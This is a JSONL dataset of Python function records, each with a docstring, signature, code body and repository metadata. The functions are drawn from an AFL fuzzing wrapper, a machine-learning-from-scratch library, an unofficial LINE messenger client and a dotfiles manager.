{"docstring": "# process the fields\n", "func_signal": "def _process_filename(self, filename):\n", "code": "fields = filename.split(',')\nfor f in fields:\n    if f == \"+cov\":\n        self.cov = True\n    elif f == \"grease\":\n        assert self.id\n        self.orig = \"greased_%s\" % self.id\n    else:\n        n,v = f.split(':', 1)\n        if n == 'id':\n            assert not self.id\n            self.id = v\n        elif n == 'src':\n            assert not self.source_ids\n            self.source_ids = v.split('+')\n        elif n == 'sync':\n            assert not self.synced_from\n            self.synced_from = v\n        elif n == 'op':\n            assert not self.op\n            self.op = v\n        elif n == 'rep':\n            assert not self.rep\n            self.rep = v\n        elif n == 'orig':\n            assert not self.orig\n            self.orig = v\n        elif n == 'pos':\n            assert not self.pos\n            self.pos = v\n        elif n == 'val':\n            assert not self.val\n            self.val = v\n        elif n == 'from': # driller uses this instead of synced/src\n            instance, from_id = v[:-6], v[-6:]\n            self.synced_from = instance\n            self.source_ids.append(from_id)\n        elif n == 'sig':\n            assert not self.crash\n            assert not self.sig\n            assert self.id\n            self.crash = True\n            self.sig = v\n            self.id = 'c'+self.id\n        else:\n            l.warning(\"Got unexpected field %s with value %s for file %s.\", n, v, filename)\n            self.other_fields[n] = v\n\nassert self.id is not None\nassert self.source_ids or self.orig", "path": "fuzzer\\hierarchy.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "\"\"\"Start minimizing\"\"\"\n\n", "func_signal": "def minimize(self):\n", "code": "self._start_minimizer().wait()\n\nwith open(self.output_testcase, 'rb') as f: result = f.read()\n\nshutil.rmtree(self.work_dir)\nself._removed = True\n\nreturn result", "path": "fuzzer\\minimizer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "'''\nretrieve the bitmap for the fuzzer `fuzzer`.\n:return: a string containing the contents of the bitmap.\n'''\n\n", "func_signal": "def bitmap(self, fuzzer='fuzzer-master'):\n", "code": "if not fuzzer in os.listdir(self.out_dir):\n    raise ValueError(\"fuzzer '%s' does not exist\" % fuzzer)\n\nbitmap_path = os.path.join(self.out_dir, fuzzer, \"fuzz_bitmap\")\n\nbdata = None\ntry:\n    with open(bitmap_path, \"rb\") as f:\n        bdata = f.read()\nexcept IOError:\n    pass\n\nreturn bdata", "path": "fuzzer\\fuzzer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "'''\npollenate a fuzzing job with new testcases\n\n:param testcases: list of bytes objects representing new inputs to introduce\n'''\n\n", "func_signal": "def pollenate(self, testcases):\n", "code": "nectary_queue_directory = os.path.join(self.out_dir, 'pollen', 'queue')\nif not 'pollen' in os.listdir(self.out_dir):\n    os.makedirs(nectary_queue_directory)\n\npollen_cnt = len(os.listdir(nectary_queue_directory))\n\nfor tcase in testcases:\n    with open(os.path.join(nectary_queue_directory, \"id:%06d,src:pollenation\" % pollen_cnt), \"wb\") as f:\n        f.write(tcase)\n\n    pollen_cnt += 1", "path": "fuzzer\\fuzzer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "\"\"\"\nGet the seeds (including inputs introduced by extensions) that\nresulted in coverage and crashes.\n\"\"\"\n", "func_signal": "def seed_contributions(self):\n", "code": "sorted_inputs = sorted((\n    i for i in self.inputs.values() if i.instance.startswith('fuzzer-')\n), key=lambda j: j.timestamp)\n\nfound = set()\ncontributions = { }\nfor s in tqdm.tqdm(sorted_inputs):\n    o = max(s.origins, key=lambda i: i.timestamp)\n    if s.crash:\n        contributions.setdefault(o, (set(),set()))[1].add(s)\n    else:\n        c = o.transition_set - found\n        if not c:\n            continue\n        contributions.setdefault(o, (set(),set()))[0].update(c)\n        found |= c\n\nreturn sorted(((k, list(map(len,v))) for k,v in contributions.iteritems()), key=lambda x: x[0].timestamp)", "path": "fuzzer\\hierarchy.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "\"\"\"\nReally hacky way to remove cycles in hierarchies (wtf).\n\"\"\"\n\n", "func_signal": "def _remove_cycles(self):\n", "code": "G = self.make_graph()\ncycles = list(networkx.simple_cycles(G))\nif not cycles:\n    return False\nelse:\n    cycles[0][0].looped = True\n    cycles[0][0].sources[:] = [ ]\n    return True", "path": "fuzzer\\hierarchy.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "\"\"\"\n:param binary_path: path to the binary which the testcase applies to\n:param testcase: string representing the contents of the testcase\n\"\"\"\n\n", "func_signal": "def __init__(self, binary_path, testcase):\n", "code": "self.binary_path = binary_path\nself.testcase = testcase\n\nFuzzer._perform_env_checks()\n\nself.base = Fuzzer._get_base()\nl.debug(\"got base dir %s\", self.base)\n\n# unfortunately here is some code reuse between Fuzzer and Minimizer\np = angr.Project(self.binary_path)\ntracer_id = 'cgc' if p.loader.main_object.os == 'cgc' else p.arch.qemu_name\nself.tmin_path = os.path.join(shellphish_afl.afl_dir(tracer_id), \"afl-tmin\")\nself.afl_path_var = shellphish_afl.afl_path_var(tracer_id)\n\nl.debug(\"tmin_path: %s\", self.tmin_path)\nl.debug(\"afl_path_var: %s\", self.afl_path_var)\n\nos.environ['AFL_PATH'] = self.afl_path_var\n\n# create temp\nself.work_dir = tempfile.mkdtemp(prefix='tmin-', dir='/tmp/')\n\n# flag for work directory removal\nself._removed = False\n\nself.input_testcase = os.path.join(self.work_dir, 'testcase')\nself.output_testcase = os.path.join(self.work_dir, 'minimized_result')\n\nl.debug(\"input_testcase: %s\", self.input_testcase)\nl.debug(\"output_testcase: %s\", self.output_testcase)\n\n# populate contents of input testcase\nwith open(self.input_testcase, 'wb') as f:\n    f.write(testcase)", "path": "fuzzer\\minimizer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "\"\"\"\nSpawn the mutation extension `name`\n:param name: name of extension\n:returns: True if able to spawn extension\n\"\"\"\n\n", "func_signal": "def add_extension(self, name):\n", "code": "extension_path = os.path.join(os.path.dirname(__file__), \"..\", \"fuzzer\", \"extensions\", \"%s.py\" % name)\nrpath = os.path.realpath(extension_path)\n\nl.debug(\"Attempting to spin up extension %s\", rpath)\n\nif os.path.exists(extension_path):\n    args = [sys.executable, extension_path, self.binary_path, self.out_dir]\n\n    outfile_leaf = \"%s-%d.log\" % (name, len(self.procs))\n    outfile = os.path.join(self.job_dir, outfile_leaf)\n    with open(outfile, \"wb\") as fp:\n        p = subprocess.Popen(args, stderr=fp)\n    self.procs.append(p)\n    return True\n\nreturn False", "path": "fuzzer\\fuzzer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "\"\"\"\nRetrieve the crashes discovered by AFL. Only return those crashes which\nrecieved a signal within 'signals' as the kill signal.\n\n:param signals: list of valid kill signal numbers\n:return: a list of strings which are crashing inputs\n\"\"\"\n\n", "func_signal": "def _get_crashing_inputs(self, signals):\n", "code": "crashes = set()\nfor fuzzer in os.listdir(self.out_dir):\n    crashes_dir = os.path.join(self.out_dir, fuzzer, \"crashes\")\n\n    if not os.path.isdir(crashes_dir):\n        # if this entry doesn't have a crashes directory, just skip it\n        continue\n\n    for crash in os.listdir(crashes_dir):\n        if crash == \"README.txt\":\n            # skip the readme entry\n            continue\n\n        attrs = dict(map(lambda x: (x[0], x[-1]), map(lambda y: y.split(\":\"), crash.split(\",\"))))\n\n        if int(attrs['sig']) not in signals:\n            continue\n\n        crash_path = os.path.join(crashes_dir, crash)\n        with open(crash_path, 'rb') as f:\n            crashes.add(f.read())\n\nreturn list(crashes)", "path": "fuzzer\\fuzzer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "\"\"\"\nTest that the fuzzer spawns correctly\n\"\"\"\n\n", "func_signal": "def test_fuzzer_spawn():\n", "code": "binary = os.path.join(bin_location, \"tests/cgc/PIZZA_00001\")\n\nf = fuzzer.Fuzzer(binary, \"work\")\nf.start()\n\nfor _ in range(15):\n    if f.alive:\n        break\n    time.sleep(1)\n\nnose.tools.assert_true(f.alive)\nif f.alive:\n    f.kill()", "path": "tests\\test_fuzzer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "\"\"\"\nTest that the fuzzer spins up for a multicb challenge.\n\"\"\"\n\n", "func_signal": "def test_multicb_spawn():\n", "code": "binaries = [os.path.join(bin_location, \"tests/cgc/251abc02_01\"),\n            os.path.join(bin_location, \"tests/cgc/251abc02_02\")]\n\nf = fuzzer.Fuzzer(binaries, \"work\", create_dictionary=True)\nf.start()\n\nfor _ in range(15):\n    if f.alive:\n        break\n    time.sleep(1)\n\nnose.tools.assert_true(f.alive)\n\ndictionary_path = os.path.join(\"work\", \"251abc02_01\", \"251abc02_01.dict\")\n\nnose.tools.assert_true(os.path.isfile(dictionary_path))\n\nif f.alive:\n    f.kill()", "path": "tests\\test_fuzzer.py", "repo_name": "shellphish/fuzzer", "stars": 619, "license": "bsd-2-clause", "language": "python", "size": 144}
{"docstring": "\"\"\" Simple batch generator \"\"\"\n", "func_signal": "def batch_iterator(X, y=None, batch_size=64):\n", "code": "n_samples = X.shape[0]\nfor i in np.arange(0, n_samples, batch_size):\n    begin, end = i, min(i+batch_size, n_samples)\n    if y is not None:\n        yield X[begin:end], y[begin:end]\n    else:\n        yield X[begin:end]", "path": "utils\\data_manipulation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Compare y_true to y_pred and return the accuracy \"\"\"\n", "func_signal": "def accuracy_score(y_true, y_pred):\n", "code": "accuracy = np.sum(y_true == y_pred, axis=0) / len(y_true)\nreturn accuracy", "path": "utils\\data_operation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Return random subsets (with replacements) of the data \"\"\"\n", "func_signal": "def get_random_subsets(X, y, n_subsets, replacements=True):\n", "code": "n_samples = np.shape(X)[0]\n# Concatenate x and y and do a random shuffle\nX_y = np.concatenate((X, y.reshape((1, len(y))).T), axis=1)\nnp.random.shuffle(X_y)\nsubsets = []\n\n# Uses 50% of training samples without replacements\nsubsample_size = int(n_samples // 2)\nif replacements:\n    subsample_size = n_samples      # 100% with replacements\n\nfor _ in range(n_subsets):\n    idx = np.random.choice(\n        range(n_samples),\n        size=np.shape(range(subsample_size)),\n        replace=replacements)\n    X = X_y[idx][:, :-1]\n    y = X_y[idx][:, -1]\n    subsets.append([X, y])\nreturn subsets", "path": "utils\\data_manipulation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Split the data into train and test sets \"\"\"\n", "func_signal": "def train_test_split(X, y, test_size=0.5, shuffle=True, seed=None):\n", "code": "if shuffle:\n    X, y = shuffle_data(X, y, seed)\n# Split the training data from test data in the ratio specified in\n# test_size\nsplit_i = len(y) - int(len(y) // (1 / test_size))\nX_train, X_test = X[:split_i], X[split_i:]\ny_train, y_test = y[:split_i], y[split_i:]\n\nreturn X_train, X_test, y_train, y_test", "path": "utils\\data_manipulation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Standardize the dataset X \"\"\"\n", "func_signal": "def standardize(X):\n", "code": "X_std = X\nmean = X.mean(axis=0)\nstd = X.std(axis=0)\nfor col in range(np.shape(X)[1]):\n    if std[col]:\n        X_std[:, col] = (X_std[:, col] - mean[col]) / std[col]\n# X_std = (X - X.mean(axis=0)) / X.std(axis=0)\nreturn X_std", "path": "utils\\data_manipulation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Returns the mean squared error between y_true and y_pred \"\"\"\n", "func_signal": "def mean_squared_error(y_true, y_pred):\n", "code": "mse = np.mean(np.power(y_true - y_pred, 2))\nreturn mse", "path": "utils\\data_operation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Calculate the entropy of label array y \"\"\"\n", "func_signal": "def calculate_entropy(y):\n", "code": "log2 = lambda x: math.log(x) / math.log(2)\nunique_labels = np.unique(y)\nentropy = 0\nfor label in unique_labels:\n    count = len(y[y == label])\n    p = count / len(y)\n    entropy += -p * log2(p)\nreturn entropy", "path": "utils\\data_operation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "# \u521d\u59cb\u5316\u53c2\u6570\n", "func_signal": "def initialize_weights(self, n_features):\n", "code": "limit = np.sqrt(1 / n_features)\nw = np.random.uniform(-limit, limit, (n_features, 1))\nb = 0\nself.w = np.insert(w, 0, b, axis=0)", "path": "linear_regression\\linear_regression.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "# \u8bad\u7ec3\uff0c\u6bcf\u68f5\u6811\u4f7f\u7528\u968f\u673a\u7684\u6570\u636e\u96c6(bootstrap)\u548c\u968f\u673a\u7684\u7279\u5f81\n# every tree use random data set(bootstrap) and random feature\n", "func_signal": "def fit(self, X, Y):\n", "code": "sub_sets = self.get_bootstrap_data(X, Y)\nn_features = X.shape[1]\nif self.max_features == None:\n    self.max_features = int(np.sqrt(n_features))\nfor i in range(self.n_estimators):\n    # \u751f\u6210\u968f\u673a\u7684\u7279\u5f81\n    # get random feature\n    sub_X, sub_Y = sub_sets[i]\n    idx = np.random.choice(n_features, self.max_features, replace=True)\n    sub_X = sub_X[:, idx]\n    self.trees[i].fit(sub_X, sub_Y)\n    self.trees[i].feature_indices = idx\n    print(\"tree\", i, \"fit complete\")", "path": "random_forest\\random_forest_model.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Calculate the covariance matrix for the dataset X \"\"\"\n", "func_signal": "def calculate_covariance_matrix(X, Y=None):\n", "code": "if Y is None:\n    Y = X\nn_samples = np.shape(X)[0]\ncovariance_matrix = (1 / (n_samples-1)) * (X - X.mean(axis=0)).T.dot(Y - Y.mean(axis=0))\n\nreturn np.array(covariance_matrix, dtype=float)", "path": "utils\\data_operation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Calculate the correlation matrix for the dataset X \"\"\"\n", "func_signal": "def calculate_correlation_matrix(X, Y=None):\n", "code": "if Y is None:\n    Y = X\nn_samples = np.shape(X)[0]\ncovariance = (1 / n_samples) * (X - X.mean(0)).T.dot(Y - Y.mean(0))\nstd_dev_X = np.expand_dims(calculate_std_dev(X), 1)\nstd_dev_y = np.expand_dims(calculate_std_dev(Y), 1)\ncorrelation_matrix = np.divide(covariance, std_dev_X.dot(std_dev_y.T))\n\nreturn np.array(correlation_matrix, dtype=float)", "path": "utils\\data_operation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Calculate the standard deviations of the features in dataset X \"\"\"\n", "func_signal": "def calculate_std_dev(X):\n", "code": "std_dev = np.sqrt(calculate_variance(X))\nreturn std_dev", "path": "utils\\data_operation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Divide dataset based on if sample value on feature index is larger than\n    the given threshold \"\"\"\n", "func_signal": "def divide_on_feature(X, feature_i, threshold):\n", "code": "split_func = None\nif isinstance(threshold, int) or isinstance(threshold, float):\n    split_func = lambda sample: sample[feature_i] >= threshold\nelse:\n    split_func = lambda sample: sample[feature_i] == threshold\n\nX_1 = np.array([sample for sample in X if split_func(sample)])\nX_2 = np.array([sample for sample in X if not split_func(sample)])\n\nreturn np.array([X_1, X_2])", "path": "utils\\data_manipulation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Return the variance of the features in dataset X \"\"\"\n", "func_signal": "def calculate_variance(X):\n", "code": "mean = np.ones(np.shape(X)) * X.mean(0)\nn_samples = np.shape(X)[0]\nvariance = (1 / n_samples) * np.diag((X - mean).T.dot(X - mean))\n\nreturn variance", "path": "utils\\data_operation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Split the data into k sets of training / test data \"\"\"\n", "func_signal": "def k_fold_cross_validation_sets(X, y, k, shuffle=True):\n", "code": "if shuffle:\n    X, y = shuffle_data(X, y)\n\nn_samples = len(y)\nleft_overs = {}\nn_left_overs = (n_samples % k)\nif n_left_overs != 0:\n    left_overs[\"X\"] = X[-n_left_overs:]\n    left_overs[\"y\"] = y[-n_left_overs:]\n    X = X[:-n_left_overs]\n    y = y[:-n_left_overs]\n\nX_split = np.split(X, k)\ny_split = np.split(y, k)\nsets = []\nfor i in range(k):\n    X_test, y_test = X_split[i], y_split[i]\n    X_train = np.concatenate(X_split[:i] + X_split[i + 1:], axis=0)\n    y_train = np.concatenate(y_split[:i] + y_split[i + 1:], axis=0)\n    sets.append([X_train, X_test, y_train, y_test])\n\n# Add left over samples to last set as training samples\nif n_left_overs != 0:\n    np.append(sets[-1][0], left_overs[\"X\"], axis=0)\n    np.append(sets[-1][2], left_overs[\"y\"], axis=0)\n\nreturn np.array(sets)", "path": "utils\\data_manipulation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Converts a vector into an diagonal matrix \"\"\"\n", "func_signal": "def make_diagonal(x):\n", "code": "m = np.zeros((len(x), len(x)))\nfor i in range(len(m[0])):\n    m[i, i] = x[i]\nreturn m", "path": "utils\\data_manipulation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" One-hot encoding of nominal values \"\"\"\n", "func_signal": "def to_categorical(x, n_col=None):\n", "code": "if not n_col:\n    n_col = np.amax(x) + 1\none_hot = np.zeros((x.shape[0], n_col))\none_hot[np.arange(x.shape[0]), x] = 1\nreturn one_hot", "path": "utils\\data_manipulation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Random shuffle of the samples in X and y \"\"\"\n", "func_signal": "def shuffle_data(X, y, seed=None):\n", "code": "if seed:\n    np.random.seed(seed)\nidx = np.arange(X.shape[0])\nnp.random.shuffle(idx)\nreturn X[idx], y[idx]", "path": "utils\\data_manipulation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Calculates the l2 distance between two vectors \"\"\"\n", "func_signal": "def euclidean_distance(x1, x2):\n", "code": "distance = 0\n# Squared distance between each coordinate\nfor i in range(len(x1)):\n    distance += pow((x1[i] - x2[i]), 2)\nreturn math.sqrt(distance)", "path": "utils\\data_operation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\" Normalize the dataset X \"\"\"\n", "func_signal": "def normalize(X, axis=-1, order=2):\n", "code": "l2 = np.atleast_1d(np.linalg.norm(X, order, axis))\nl2[l2 == 0] = 1\nreturn X / np.expand_dims(l2, axis)", "path": "utils\\data_manipulation.py", "repo_name": "RRdmlearning/Machine-Learning-From-Scratch", "stars": 627, "license": "None", "language": "python", "size": 91}
{"docstring": "\"\"\"Create a chat room with contact ids\"\"\"\n", "func_signal": "def createRoomWithIds(self, ids=[]):\n", "code": "try:\n    room = LineRoom(self, self._createRoom(ids))\n    self.rooms.append(room)\n\n    return room\nexcept Exception as e:\n    self.raise_error(e)\n\n    return None", "path": "line\\client.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Accept a group invitation\n\n:param group: LineGroup instance\n\"\"\"\n", "func_signal": "def acceptGroupInvitation(self, group):\n", "code": "if self._check_auth():\n    try:\n        self._acceptGroupInvitation(group.id)\n        return True\n    except Exception as e:\n        self.raise_error(e)\n        return False", "path": "line\\client.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Invite contacts into room\n\n:param room: LineRoom instance\n:param contacts: LineContact instances to invite\n\"\"\"\n", "func_signal": "def inviteIntoRoom(self, room, contacts=[]):\n", "code": "contact_ids = [contact.id for contact in contacts]\nself._inviteIntoRoom(room.id, contact_ids)", "path": "line\\client.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Get a group by id\n\n:param id: id of a group\n\"\"\"\n", "func_signal": "def getGroupById(self, id):\n", "code": "for group in self.groups:\n    if group.id == id:\n        return group\n\nreturn None", "path": "line\\client.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Create a chat room with contacts\"\"\"\n", "func_signal": "def createRoomWithContacts(self, contacts=[]):\n", "code": "try:\n    contact_ids = []\n    for contact in contacts:\n        contact_ids.append(contact.id)\n\n    room = LineRoom(self, self._createRoom(contact_ids))\n    self.rooms.append(room)\n\n    return room\nexcept Exception as e:\n    self.raise_error(e)\n\n    return None", "path": "line\\client.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Find and add a `contact` by email\n\n:param email: email\n\"\"\"\n", "func_signal": "def _findAndAddContactByEmail(self, email):\n", "code": "try:\n    contact = self._findAndAddContactsByEmail(email)\nexcept TalkException as e:\n    self.raise_error(e.reason)\n\ncontact = contact.values()[0]\n\nfor c in self.contacts:\n    if c.id == contact.mid:\n        self.raise_error(\"%s already exists\" % contact.displayName)\n        return\n\nc = LineContact(self, contact)\nself.contacts.append(c)\n\nself.contacts.sort()\nreturn c", "path": "line\\client.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Get a room by id\n\n:param id: id of a room\n\"\"\"\n", "func_signal": "def getRoomById(self, id):\n", "code": "for room in self.rooms:\n    if room.id == id:\n        return room\n\nreturn None", "path": "line\\client.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Refresh active chat rooms\"\"\"\n", "func_signal": "def refreshActiveRooms(self):\n", "code": "start = 1\ncount = 50\n\nself.rooms = []\n\nwhile True:\n    channel = self._getMessageBoxCompactWrapUpList(start, count)\n\n    for box in channel.messageBoxWrapUpList:\n        if box.messageBox.midType == ToType.ROOM:\n            room = LineRoom(self, self._getRoom(box.messageBox.id))\n            self.rooms.append(room)\n\n    if len(channel.messageBoxWrapUpList) == count:\n        start += count\n    else:\n        break", "path": "line\\client.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Send a message\n\n:param text: text message to send\n\"\"\"\n", "func_signal": "def sendMessage(self, text):\n", "code": "try:\n    message = Message(to=self.id, text=text.encode('utf-8'))\n    self._client.sendMessage(message)\n\n    return True\nexcept Exception as e:\n    raise e", "path": "line\\models.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Get MessageBox by id\n\n:param id: `contact` id or `group` id or `room` id\n\"\"\"\n", "func_signal": "def getMessageBox(self, id):\n", "code": "try:\n    messageBoxWrapUp = self._getMessageBoxCompactWrapUp(id)\n\n    return messageBoxWrapUp.messageBox\nexcept:\n    return None", "path": "line\\client.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"\nAfter login, update authToken to avoid expiration of\nauthToken. This method skip the PinCode validation step.\n\"\"\"\n", "func_signal": "def updateAuthToken(self):\n", "code": "if self.certificate:\n    self.login()\n    self.tokenLogin()\n\n    return True\nelse:\n    self.raise_error(\"You need to login first. There is no valid certificate\")", "path": "line\\api.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"LineContact init\n\n:param client: LineClient instance\n:param contact: Conatct instace\n\"\"\"\n\n", "func_signal": "def __init__(self, client, contact):\n", "code": "self._client  = client\nself._contact = contact\n\nself.id            = contact.mid\nself.name          = contact.displayName\nself.statusMessage = contact.statusMessage", "path": "line\\models.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Get recent messages\n\n:param count: count of messages to get\n\"\"\"\n", "func_signal": "def getRecentMessages(self, count=1):\n", "code": "if self._messageBox:\n    messages = self._client.getRecentMessages(self._messageBox, count)\n\n    return messages\nelse:\n    self._messageBox = self._client.getMessageBox(self.id)\n    messages = self._client.getRecentMessages(self._messageBox, count)\n\n    return messages", "path": "line\\models.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Refresh contacts of LineClient \"\"\"\n", "func_signal": "def refreshContacts(self):\n", "code": "contact_ids = self._getAllContactIds()\ncontacts    = self._getContacts(contact_ids)\n\nself.contacts = [LineContact(self, contact) for contact in contacts]\n\nself.contacts.sort()", "path": "line\\client.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Refresh groups of LineClient\"\"\"\n", "func_signal": "def addGroupsWithIds(self, group_ids, is_joined=True):\n", "code": "new_groups  = self._getGroups(group_ids)\n\nself.groups += [LineGroup(self, group, is_joined) for group in new_groups]\n\nself.groups.sort()", "path": "line\\client.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Get contact information list from ids\n\n:returns: List of Contact list\n            - status\n            - capableVideoCall\n            - dispalyName\n            - settings\n            - pictureStatus\n            - capableVoiceCall\n            - capableBuddy\n            - mid\n            - displayNameOverridden\n            - relation\n            - thumbnailUrl\n            - createdTime\n            - facoriteTime\n            - capableMyhome\n            - attributes\n            - type\n            - phoneticName\n            - statusMessage\n\"\"\"\n", "func_signal": "def _getContacts(self, ids):\n", "code": "if type(ids) != list:\n    msg = \"argument should be list of contact ids\"\n    self.raise_error(msg)\n\nreturn self._client.getContacts(ids)", "path": "line\\api.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Name of Group and number of group members\"\"\"\n", "func_signal": "def __repr__(self):\n", "code": "if self.is_joined:\n    return '<LineGroup %s #%s>' % (self.name, len(self.members))\nelse:\n    return '<LineGroup %s #%s (invited)>' % (self.name, len(self.members))", "path": "line\\models.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Send a image\n\n:param path: local path of image to send\n\"\"\"\n", "func_signal": "def sendImage(self, path):\n", "code": "message = Message(to=self.id, text=None)\nmessage.contentType = ContentType.IMAGE\nmessage.contentPreview = None\nmessage.contentMetadata = None\n\nmessage_id = self._client.sendMessage(message).id\nfiles = {\n    'file': open(path, 'rb'),\n}\nparams = {\n    'name': 'media',\n    'oid': message_id,\n    'size': len(open(path, 'rb').read()),\n    'type': 'image',\n    'ver': '1.0',\n}\ndata = {\n    'params': json.dumps(params)\n}\nr = self._client.post_content('https://os.line.naver.jp/talk/m/upload.nhn', data=data, files=files)\nif r.status_code != 201:\n    raise Exception('Upload image failure.')\n#r.content\nreturn True", "path": "line\\models.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Send a image with given image url\n\n:param url: image url to send\n\"\"\"\n", "func_signal": "def sendImageWithURL(self, url):\n", "code": "path = '%s/pythonLine.data' % tempfile.gettempdir()\n\nr = requests.get(url, stream=True)\nif r.status_code == 200:\n    with open(path, 'w') as f:\n        shutil.copyfileobj(r.raw, f)\nelse:\n    raise Exception('Download image failure.')\n\ntry:\n    self.sendImage(path)\nexcept Exception as e:\n    raise e", "path": "line\\models.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"Groups that contact participates\"\"\"\n", "func_signal": "def groups(self):\n", "code": "groups = [group for group in self._client.groups if self.id in group.getMemberIds()]\n\nreturn groups", "path": "line\\models.py", "repo_name": "carpedm20/LINE", "stars": 805, "license": "other", "language": "python", "size": 4266}
{"docstring": "\"\"\"The current state of this dotfile.\"\"\"\n", "func_signal": "def state(self):\n", "code": "if self.target.is_symlink():\n    return 'external'\n\nif not self.name.exists():\n    # no $HOME file or symlink\n    return 'missing'\n\nif self.name.is_symlink():\n    # name exists, is a link, but isn't a link to the target\n    if not self.name.samefile(self.target):\n        return 'conflict'\n    return 'link'\n\nif not self._same_contents():\n    # name exists, is a file, but differs from the target\n    return 'conflict'\n\nreturn 'copy'", "path": "dotfiles\\dotfile.py", "repo_name": "jbernard/dotfiles", "stars": 561, "license": "other", "language": "python", "size": 448}
